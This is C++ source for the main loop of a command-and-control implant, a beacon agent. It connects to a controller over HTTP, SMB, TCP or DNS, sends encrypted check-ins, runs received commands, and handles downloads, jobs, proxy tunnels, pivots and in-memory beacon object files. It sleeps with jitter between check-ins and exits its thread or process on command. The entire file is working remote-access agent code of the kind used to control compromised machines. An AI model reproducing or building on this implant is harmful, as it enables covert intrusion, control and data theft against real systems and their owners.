#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"
#include "Boffer.h"
#include "Connector.h"

#if defined(BEACON_HTTP)
#include "ConnectorHTTP.h"
#elif defined(BEACON_SMB)
#include "ConnectorSMB.h"
#elif defined(BEACON_TCP)
#include "ConnectorTCP.h"
#elif defined(BEACON_DNS)
#include "ConnectorDNS.h"
#endif

Agent* g_Agent;
Connector* g_Connector;

static Connector* CreateConnector()
{
#if defined(BEACON_HTTP)
	return new ConnectorHTTP();
#elif defined(BEACON_SMB)
	return new ConnectorSMB();
#elif defined(BEACON_TCP)
	return new ConnectorTCP();
#elif defined(BEACON_DNS)
	return new ConnectorDNS();
#endif
}

DWORD WINAPI AgentMain(LPVOID lpParam)
{
	if (!ApiLoad())
		return 0;

	g_Agent = new Agent();
	g_Connector = CreateConnector();

	g_AsyncBofManager = new Boffer();
	g_AsyncBofManager->Initialize();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if (!g_Connector->SetProfile(&g_Agent->config->profile, beat, beatSize))
		return 0;

	MemFreeLocal((LPVOID*)&beat, beatSize);

	Packer* packerOut = new Packer();
	packerOut->Pack32(0);

	do {
		if (!g_Connector->WaitForConnection())
			continue;

		do {
			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());
				g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->Exchange(nullptr, 0, g_Agent->SessionKey);
			}

			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData())
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
			g_Connector->RecvClear();

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);
			g_AsyncBofManager->ProcessAsyncBofs(packerOut);

			if (g_Agent->IsActive()) {
				const BOOL hasOutput = (packerOut->datasize() >= 8);
				g_Connector->Sleep(g_AsyncBofManager->GetWakeupEvent(), g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
			}

		} while (g_Connector->IsConnected() && g_Agent->IsActive());

		if (!g_Agent->IsActive() && g_Connector->IsConnected()) {
			g_Agent->commander->Exit(packerOut);
			packerOut->Set32(0, packerOut->datasize());
			g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
			g_Connector->RecvClear();
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	packerOut->Clear(FALSE);
	delete packerOut;

	g_Connector->CloseConnector();
	AgentExit(g_Agent->config->exit_method);
	return 0;
}

void AgentExit(const int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}
